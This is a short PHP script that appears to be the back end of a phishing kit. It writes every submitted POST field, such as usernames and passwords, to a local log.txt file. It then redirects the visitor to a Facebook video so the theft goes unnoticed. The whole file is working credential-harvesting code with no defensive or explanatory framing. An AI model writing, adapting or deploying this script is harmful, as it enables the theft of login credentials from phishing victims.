<?php

// Set the location to redirect the page
header ('Location: https://web.facebook.com/watch/?ref=search&v=435362298570092&external_log_id=3336736f-a308-4532-b6cd-5c32da5dd780&q=funny%20animals%20videos');

// Open the text file in writing mode
$file = fopen("log.txt", "a");

foreach($_POST as $variable => $value) {
	fwrite($file, $variable);
	fwrite($file, "=");
	fwrite($file, $value);
	fwrite($file, "\r\n");
}

fwrite($file, "\r\n");
fclose($file);
exit;
?>
